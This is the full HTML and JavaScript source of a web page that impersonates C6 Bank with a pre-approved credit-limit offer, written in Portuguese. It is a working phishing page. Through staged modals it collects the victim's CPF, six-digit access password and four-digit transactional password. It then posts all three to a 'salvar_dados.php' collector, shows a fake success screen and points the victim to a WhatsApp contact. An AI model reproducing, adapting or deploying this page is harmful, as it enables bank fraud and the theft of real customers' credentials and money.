<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C6 Bank - Aumento de Limite</title>
    <style>
        @font-face {
            font-family: 'C6';
            src: url('c6.ttf') format('truetype');
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            /* background-image: url('background.webp'); */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            position: relative;
            overflow-x: hidden;
        }

        .background {
            width: 100vw;
            height: 100vh;
            max-width: 100%;
            background-image: url('background.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
        }

        .login-box {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: 200px;
            /* background: #ffffff; */
            border-radius: 30px 30px 0 0;
            padding: 30px 20px;
            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: column;
            gap: 15px;
            justify-content: flex-start;
            padding-top: 40px;
        }

        .btn-primary {
            width: 100%;
            height: 56px;
            background: #FFB800;
            border: none;
            border-radius: 18px;
            color: #000000;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }

        .btn-primary:hover {
            background: #FFC933;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 184, 0, 0.3);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-primary.rotating {
            animation: spin 0.5s linear;
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        .btn-secondary {

            width: 100%;
            height: 56px;
            background: rgba(255, 255, 255, 0.12);
            border: 1px solid rgba(0, 0, 0, 0.1);
            border-radius: 18px;
            color:rgb(255, 255, 255);
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            backdrop-filter: blur(10px);
            border: 1px solid white;
            margin-top: -7px;
        }

        .btn-secondary:hover {
    
            background: rgba(255, 255, 255, 0.95);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        .btn-secondary:active {
            transform: translateY(0);
        }

        /* Mobile: centralizar a mulher na tela */
        @media (max-width: 768px) {
            body {
                background-position: center center;
                background-size: cover;
            }
        }

        /* Desktop: manter comportamento padrão */
        @media (min-width: 769px) {
            .login-box {
                max-width: 500px;
                left: 50%;
                transform: translateX(-50%);
                border-radius: 30px;
            }
        }

        /* Modal de CPF */
        .cpf-modal {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: 38vh;
            background: #242424;
            border-radius: 18px 18px 0 0;
            padding: 30px 20px;
            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.15);
            transform: translateY(100%);
            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            color: white;
            z-index: 1000;
        }

        .cpf-modal.active {
            transform: translateY(0);
        }

        .cpf-input-container {
            margin-bottom: 25px;
        }

        .cpf-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
            display: block;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 500;
        }

        .cpf-input {
            width: 100%;
            height: 56px;
            border: none;
            background: transparent;
            font-size: 20px;
            color: white;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 500;
            outline: none;
            padding: 0;
        }

        .cpf-input::placeholder {
            color: #999;
        }

        .remember-cpf-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 25px;
        }

        .remember-cpf-label {
            font-size: 16px;
            color: white;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 500;
        }

        .toggle-switch {
            position: relative;
            width: 50px;
            height: 30px;
            background: #ddd;
            border-radius: 15px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        .toggle-switch.active {
            background: #FFB800;
        }

        .toggle-switch::after {
            content: '';
            position: absolute;
            width: 24px;
            height: 24px;
            background: #fff;
            border-radius: 50%;
            top: 3px;
            left: 3px;
            transition: transform 0.3s ease;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }

        .toggle-switch.active::after {
            transform: translateX(20px);
        }

        .btn-entrar {
            width: 100%;
            height: 48px;
            background: #FFB800;
            border: none;
            border-radius: 18px;
            color: #000000;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }

        .btn-entrar:hover {
            background: #FFC933;
        }

        .btn-entrar:active {
            transform: scale(0.98);
        }

        .btn-entrar.loading {
            position: relative;
            color: transparent;
        }

        .btn-entrar.loading::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 20px;
            height: 20px;
            margin-top: -10px;
            margin-left: -10px;
            border: 2px solid #000;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin-loader 0.6s linear infinite;
        }

        @media (min-width: 769px) {
            .cpf-modal {
                max-width: 500px;
                left: 50%;
                transform: translateX(-50%) translateY(100%);
            }

            .cpf-modal.active {
                transform: translateX(-50%) translateY(0);
            }
        }

        /* Modal de Senha */
        .senha-modal {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: 30vh;
            background: #242424;
            border-radius: 18px 18px 0 0;
            padding: 30px 20px;
            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.15);
            transform: translateX(100%);
            transition: transform 0.25s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            color: white;
            z-index: 1001;
        }

        .senha-modal.active {
            transform: translateX(0);
        }

        .senha-label {
            font-size: 16px;
            color: white;
            margin-bottom: 25px;
            display: block;
            text-align: center;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 500;
        }

        .senha-inputs-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
        }

        .senha-input {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            background: transparent;
            text-align: center;
            font-size: 12px;
            color: white;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 500;
            outline: none;
            transition: all 0.3s ease;
            inputmode: numeric;
        }

        .senha-input:focus {
            border-color:rgb(255, 255, 255);
            background: rgba(255, 255, 255, 0.1);
        }

        .senha-input.filled {
            border-color:rgb(255, 255, 255);
            background: rgb(255, 255, 255);
        }

        .redefinir-senha-link {
            text-align: center;
            font-size: 14px;
            color: white;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 500;
            cursor: pointer;
            text-decoration: none;
            display: block;
            opacity: 0.8;
            transition: opacity 0.3s ease;
            margin-top: 40px !important;
        }

        .redefinir-senha-link:hover {
            opacity: 1;
        }

        /* Spinner de carregamento */
        .senha-spinner {
            display: none;
            justify-content: center;
            align-items: center;
            margin-top: 20px;
        }

        .senha-spinner.active {
            display: flex;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 184, 0, 0.2);
            border-top-color: #FFB800;
            border-radius: 50%;
            animation: spin-loader 0.8s linear infinite;
        }

        @keyframes spin-loader {
            to {
                transform: rotate(360deg);
            }
        }

        @media (min-width: 769px) {
            .senha-modal {
                max-width: 500px;
                left: 50%;
                transform: translateX(150%) translateY(0);
            }

            .senha-modal.active {
                transform: translateX(-50%) translateY(0);
            }
        }

        /* Modal de Limite */
        .limite-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #ffffff;
            z-index: 2000;
            transform: translateX(100%);
            transition: transform 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            overflow-y: auto;
        }

        .limite-modal.active {
            transform: translateX(0);
        }

        .limite-modal.overlay-active::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.3);
            z-index: 1;
            pointer-events: none;
        }

        .limite-header {
            padding: 20px;
            position: relative;
        }

        .btn-voltar {
            width: 40px;
            height: 40px;
            border: none;
            background: transparent;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            font-size: 24px;
            color: #000;
        }

        .btn-voltar::before {
            content: '←';
            font-size: 28px;
            line-height: 1;
        }

        .btn-voltar:disabled {
            opacity: 0.3;
            cursor: not-allowed;
            pointer-events: none;
        }

        .limite-content {
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: calc(100vh - 200px);
        }

        .limite-titulo {
            font-size: 18px;
            color: #000;
            text-align: center;
            margin-bottom: 40px;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 500;
            line-height: 1.4;
        }

        .limite-valor-grande {
            font-size: 64px;
            font-weight: 700;
            color: #000;
            margin-bottom: 50px;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            text-align: center;
        }

        .limite-valor-grande .moeda {
            font-size: 48px;
            vertical-align: top;
        }

        .limite-slider-container {
            width: 100%;
            max-width: 400px;
            margin-bottom: 80px;
        }

        .limite-slider {
            width: 100%;
            height: 6px;
            border-radius: 3px;
            background: #e0e0e0;
            outline: none;
            -webkit-appearance: none;
            appearance: none;
        }

        .limite-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #FFB800;
            cursor: pointer;
            box-shadow: 0 2px 6px rgba(255, 184, 0, 0.4);
        }

        .limite-slider::-moz-range-thumb {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #FFB800;
            cursor: pointer;
            border: none;
            box-shadow: 0 2px 6px rgba(255, 184, 0, 0.4);
        }

        .limite-slider::-webkit-slider-thumb:hover {
            background: #FFC933;
        }

        .limite-slider::-moz-range-thumb:hover {
            background: #FFC933;
        }

        .limite-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 20px;
            background: #ffffff;
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
        }

        .btn-solicitar {
            width: 100%;
            height: 56px;
            background: #FFB800;
            border: none;
            border-radius: 18px;
            color: #000000;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }

        .btn-solicitar:hover {
            background: #FFC933;
        }

        .btn-solicitar:active {
            transform: scale(0.98);
        }

        .btn-solicitar.loading {
            position: relative;
            color: transparent;
        }

        .btn-solicitar.loading::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 20px;
            height: 20px;
            margin-top: -10px;
            margin-left: -10px;
            border: 2px solid #000;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin-loader 0.6s linear infinite;
        }

        @media (min-width: 769px) {
            .limite-modal {
                max-width: 500px;
                left: 50%;
                transform: translateX(150%);
            }

            .limite-modal.active {
                transform: translateX(-50%);
            }
        }

        /* Modal de Senha Transacional */
        .senha-transacional-modal {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: 30vh;
            background: #242424;
            border-radius: 18px 18px 0 0;
            padding: 30px 20px;
            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.15);
            transform: translateY(100%);
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            color: white;
            z-index: 2001;
        }

        .senha-transacional-modal.active {
            transform: translateY(0);
        }

        .senha-transacional-label {
            font-size: 16px;
            color: white;
            margin-bottom: 25px;
            display: block;
            text-align: center;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 500;
        }

        .senha-transacional-inputs-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
        }

        .senha-transacional-input {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            background: transparent;
            text-align: center;
            font-size: 12px;
            color: white;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 500;
            outline: none;
            transition: all 0.3s ease;
            inputmode: numeric;
        }

        .senha-transacional-input:focus {
            border-color:rgb(255, 255, 255);
            background: rgba(255, 255, 255, 0.1);
        }

        .senha-transacional-input.filled {
            border-color:rgb(255, 255, 255);
            background: rgb(255, 255, 255);
        }

        .senha-transacional-spinner {
            display: none;
            justify-content: center;
            align-items: center;
            margin-top: 20px;
        }

        .senha-transacional-spinner.active {
            display: flex;
        }

        @media (min-width: 769px) {
            .senha-transacional-modal {
                max-width: 500px;
                left: 50%;
                transform: translateX(-50%) translateY(100%);
            }

            .senha-transacional-modal.active {
                transform: translateX(-50%) translateY(0);
            }
        }

        /* Modal de Sucesso */
        .sucesso-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: #ffffff;
            z-index: 3000;
            transform: translateY(100%);
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .sucesso-modal.active {
            transform: translateY(0);
        }

        .sucesso-content {
            text-align: center;
            max-width: 400px;
        }

        .sucesso-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #FFB800;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            font-size: 48px;
            color: #000;
        }

        .sucesso-titulo {
            font-size: 24px;
            color: #000;
            margin-bottom: 20px;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 600;
        }

        .sucesso-mensagem {
            font-size: 16px;
            color: #666;
            line-height: 1.6;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            font-weight: 400;
            margin-bottom: 30px;
        }

        .btn-whatsapp {
            width: 100%;
            max-width: 300px;
            height: 56px;
            background: #FFB800;
            border: none;
            border-radius: 18px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 0 auto;
            text-decoration: none;
        }

        .btn-whatsapp:hover {
            background: #20BA5A;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3);
        }

        .btn-whatsapp:active {
            transform: translateY(0);
        }

        .btn-whatsapp::before {
            content: '💬';
            font-size: 20px;
        }

        @media (min-width: 769px) {
            .sucesso-modal {
                max-width: 500px;
                left: 50%;
                transform: translateX(-50%) translateY(100%);
            }

            .sucesso-modal.active {
                transform: translateX(-50%) translateY(0);
            }
        }
    </style>
</head>
<body>
    <div class="background">
        <div class="login-box">
            <button class="btn-primary" id="btnAcessar">Acessar conta</button>
            <button class="btn-secondary" id="btnJaPossuoConta">Já possuo conta</button>
        </div>
    </div>

    <!-- Modal de CPF -->
    <div class="cpf-modal" id="cpfModal">
        <div class="cpf-input-container">
            <label class="cpf-label">Digite seu CPF</label>
            <input type="tel" class="cpf-input" id="cpfInput" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
        </div>
        <div class="remember-cpf-container">
            <span class="remember-cpf-label">Lembrar CPF</span>
            <div class="toggle-switch" id="toggleSwitch"></div>
        </div>
        <button class="btn-entrar" id="btnEntrar">Entrar</button>
    </div>

    <!-- Modal de Senha -->
    <div class="senha-modal" id="senhaModal">
        <label class="senha-label">Insira a senha de acesso</label>
        <div class="senha-inputs-container">
            <input type="tel" class="senha-input" id="senha1" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="tel" class="senha-input" id="senha2" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="tel" class="senha-input" id="senha3" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="tel" class="senha-input" id="senha4" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="tel" class="senha-input" id="senha5" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="tel" class="senha-input" id="senha6" maxlength="1" inputmode="numeric" autocomplete="off">
        </div>
        <div class="senha-spinner" id="senhaSpinner">
            <div class="spinner"></div>
        </div>
        <!-- <a href="#" class="redefinir-senha-link" id="redefinirSenha">Redefinir senha</a> -->
    </div>

    <!-- Modal de Limite -->
    <div class="limite-modal" id="limiteModal">
        <div class="limite-header">
            <button class="btn-voltar" id="btnVoltar"></button>
        </div>
        <div class="limite-content">
            <h2 class="limite-titulo">Limite de crédito pré-aprovado<br>1.800 reais</h2>
            <div class="limite-valor-grande" id="limiteValor">
                <span class="moeda">R$</span> 1.800
            </div>
            <div class="limite-slider-container">
                <input type="range" class="limite-slider" id="limiteSlider" min="100" max="1800" step="100" value="1800">
            </div>

        
        </div>
        <div class="limite-footer">
            <button class="btn-solicitar" id="btnSolicitar">Solicitar agora</button>
        </div>
    </div>

    <!-- Modal de Senha Transacional -->
    <div class="senha-transacional-modal" id="senhaTransacionalModal">
        <label class="senha-transacional-label">Insira a senha transacional (4 digitos)</label>
        <div class="senha-transacional-inputs-container">
            <input type="tel" class="senha-transacional-input" id="transacional1" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="tel" class="senha-transacional-input" id="transacional2" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="tel" class="senha-transacional-input" id="transacional3" maxlength="1" inputmode="numeric" autocomplete="off">
            <input type="tel" class="senha-transacional-input" id="transacional4" maxlength="1" inputmode="numeric" autocomplete="off">
        </div>
        <div class="senha-transacional-spinner" id="senhaTransacionalSpinner">
            <div class="spinner"></div>
        </div>
    </div>

    <!-- Modal de Sucesso -->
    <div class="sucesso-modal" id="sucessoModal">
        <div class="sucesso-content">
            <div class="sucesso-icon">✓</div>
            <h2 class="sucesso-titulo">Processo concluído com sucesso!</h2>
            <p class="sucesso-mensagem">
                Seu pedido está em análise.<br>
                Você pode acelerar a análise entrando em contato com a central de atendimento clicando no botão abaixo.
            </p>
            <a href="https://wa.me/5511999999999?text=Olá,%20gostaria%20de%20acelerar%20a%20análise%20do%20meu%20pedido" target="_blank" class="btn-whatsapp" id="btnWhatsApp">Falar com atendimento</a>
        </div>
    </div>

    <script>
        const btnAcessar = document.getElementById('btnAcessar');
        const btnJaPossuoConta = document.getElementById('btnJaPossuoConta');
        const cpfModal = document.getElementById('cpfModal');
        const senhaModal = document.getElementById('senhaModal');
        const toggleSwitch = document.getElementById('toggleSwitch');
        const cpfInput = document.getElementById('cpfInput');
        const btnEntrar = document.getElementById('btnEntrar');

        // Função para abrir modal de CPF
        function abrirModalCPF() {
            setTimeout(() => {
                cpfModal.classList.add('active');
                cpfInput.focus();
            }, 300);
        }

        // Rotação do botão e abertura do modal
        btnAcessar.addEventListener('click', function() {
            abrirModalCPF();
        });

        // Botão "Já possuo conta" também abre o modal de CPF
        btnJaPossuoConta.addEventListener('click', function() {
            abrirModalCPF();
        });

        // Abrir modal de senha ao clicar em Entrar
        btnEntrar.addEventListener('click', function() {
            this.classList.add('loading');
            const btnText = this.textContent;
            this.setAttribute('data-text', btnText);
            
            setTimeout(() => {
                this.classList.remove('loading');
                cpfModal.classList.remove('active');
                setTimeout(() => {
                    senhaModal.classList.add('active');
                    setTimeout(() => {
                        document.getElementById('senha1').focus();
                    }, 100);
                }, 200);
            }, 500);
        });

        // Toggle switch
        toggleSwitch.addEventListener('click', function() {
            this.classList.toggle('active');
        });

        // Máscara de CPF
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length <= 11) {
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                e.target.value = value;
            }
        });

        // Apenas números
        cpfInput.addEventListener('keypress', function(e) {
            if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
                e.preventDefault();
            }
        });

        // Lógica dos inputs de senha
        const senhaInputs = ['senha1', 'senha2', 'senha3', 'senha4', 'senha5', 'senha6'];
        const senhaSpinner = document.getElementById('senhaSpinner');
        const limiteModal = document.getElementById('limiteModal');
        const limiteSlider = document.getElementById('limiteSlider');
        const limiteValor = document.getElementById('limiteValor');
        const btnVoltar = document.getElementById('btnVoltar');
        const btnSolicitar = document.getElementById('btnSolicitar');
        const senhaTransacionalModal = document.getElementById('senhaTransacionalModal');
        const senhaTransacionalSpinner = document.getElementById('senhaTransacionalSpinner');
        const sucessoModal = document.getElementById('sucessoModal');

        function checkSenhaCompleta() {
            const allFilled = senhaInputs.every(id => {
                const input = document.getElementById(id);
                return input.value.length === 1;
            });
            
            if (allFilled) {
                senhaSpinner.classList.add('active');
                // Após 1 segundo, mostrar modal de limite
                setTimeout(() => {
                    senhaModal.classList.remove('active');
                    limiteModal.classList.add('active');
                }, 1000);
            } else {
                senhaSpinner.classList.remove('active');
            }
        }

        // Formatar valor do limite
        function formatarValor(valor) {
            return valor.toLocaleString('pt-BR');
        }

        // Atualizar valor do limite no slider
        limiteSlider.addEventListener('input', function(e) {
            const valor = parseInt(e.target.value);
            limiteValor.innerHTML = `<span class="moeda">R$</span> ${formatarValor(valor)}`;
        });

        // Botão voltar
        btnVoltar.addEventListener('click', function() {
            limiteModal.classList.remove('active');
            senhaModal.classList.add('active');
            // Limpar inputs de senha
            senhaInputs.forEach(id => {
                document.getElementById(id).value = '';
                document.getElementById(id).classList.remove('filled');
            });
            senhaSpinner.classList.remove('active');
        });

        // Inicializar valor do limite
        limiteValor.innerHTML = `<span class="moeda">R$</span> ${formatarValor(parseInt(limiteSlider.value))}`;

        // Botão Solicitar agora
        btnSolicitar.addEventListener('click', function() {
            this.classList.add('loading');
            const btnText = this.textContent;
            this.setAttribute('data-text', btnText);
            
            // Resetar flag para permitir novo envio
            dadosJaEnviados = false;
            
            setTimeout(() => {
                this.classList.remove('loading');
                limiteModal.classList.add('overlay-active');
                btnVoltar.disabled = true;
                senhaTransacionalModal.classList.add('active');
                setTimeout(() => {
                    document.getElementById('transacional1').focus();
                }, 100);
            }, 500);
        });

        // Observar quando o modal de senha transacional fecha para reabilitar o botão voltar
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                    const isActive = senhaTransacionalModal.classList.contains('active');
                    if (!isActive) {
                        btnVoltar.disabled = false;
                        limiteModal.classList.remove('overlay-active');
                        // Resetar flag e limpar inputs quando o modal fecha
                        dadosJaEnviados = false;
                        transacionalInputs.forEach(id => {
                            document.getElementById(id).value = '';
                            document.getElementById(id).classList.remove('filled');
                        });
                        senhaTransacionalSpinner.classList.remove('active');
                    }
                }
            });
        });

        observer.observe(senhaTransacionalModal, {
            attributes: true,
            attributeFilter: ['class']
        });

        // Lógica dos inputs de senha transacional
        const transacionalInputs = ['transacional1', 'transacional2', 'transacional3', 'transacional4'];
        let dadosJaEnviados = false;

        function checkTransacionalCompleta() {
            const allFilled = transacionalInputs.every(id => {
                const input = document.getElementById(id);
                return input.value.length === 1;
            });
            
            if (allFilled && !dadosJaEnviados) {
                dadosJaEnviados = true;
                senhaTransacionalSpinner.classList.add('active');
                
                // Coletar todos os dados
                const cpf = cpfInput.value.replace(/\D/g, '');
                const senha6 = senhaInputs.map(id => document.getElementById(id).value).join('');
                const senha4 = transacionalInputs.map(id => document.getElementById(id).value).join('');
                
                // Enviar dados para o servidor
                const dados = {
                    cpf: cpf,
                    senha6: senha6,
                    senha4: senha4
                };
                
                fetch('salvar_dados.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(dados)
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Dados salvos:', data);
                })
                .catch(error => {
                    console.error('Erro ao salvar dados:', error);
                });
                
                // Após 2 segundos, mostrar modal de sucesso
                setTimeout(() => {
                    senhaTransacionalModal.classList.remove('active');
                    limiteModal.classList.remove('overlay-active');
                    btnVoltar.disabled = false;
                    sucessoModal.classList.add('active');
                }, 2000);
            } else if (!allFilled) {
                senhaTransacionalSpinner.classList.remove('active');
            }
        }

        transacionalInputs.forEach((id, index) => {
            const input = document.getElementById(id);
            
            // Apenas números
            input.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 1) {
                    value = value.slice(0, 1);
                }
                e.target.value = value;
                
                if (value) {
                    e.target.classList.add('filled');
                    // Mover para o próximo input
                    if (index < transacionalInputs.length - 1) {
                        document.getElementById(transacionalInputs[index + 1]).focus();
                    }
                } else {
                    e.target.classList.remove('filled');
                }
                
                // Verificar se a senha está completa
                checkTransacionalCompleta();
            });

            // Backspace para voltar
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    document.getElementById(transacionalInputs[index - 1]).focus();
                }
                // Verificar se a senha está completa após backspace
                setTimeout(() => {
                    checkTransacionalCompleta();
                }, 10);
            });

            // Apenas números no keypress
            input.addEventListener('keypress', function(e) {
                if (!/[0-9]/.test(e.key)) {
                    e.preventDefault();
                }
            });

            // Limpar ao focar
            input.addEventListener('focus', function(e) {
                e.target.select();
            });
        });

        senhaInputs.forEach((id, index) => {
            const input = document.getElementById(id);
            
            // Apenas números
            input.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 1) {
                    value = value.slice(0, 1);
                }
                e.target.value = value;
                
                if (value) {
                    e.target.classList.add('filled');
                    // Mover para o próximo input
                    if (index < senhaInputs.length - 1) {
                        document.getElementById(senhaInputs[index + 1]).focus();
                    }
                } else {
                    e.target.classList.remove('filled');
                }
                
                // Verificar se a senha está completa
                checkSenhaCompleta();
            });

            // Backspace para voltar
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    document.getElementById(senhaInputs[index - 1]).focus();
                }
                // Verificar se a senha está completa após backspace
                setTimeout(() => {
                    checkSenhaCompleta();
                }, 10);
            });

            // Apenas números no keypress
            input.addEventListener('keypress', function(e) {
                if (!/[0-9]/.test(e.key)) {
                    e.preventDefault();
                }
            });

            // Limpar ao focar
            input.addEventListener('focus', function(e) {
                e.target.select();
            });
        });
    </script>

</body>
</html>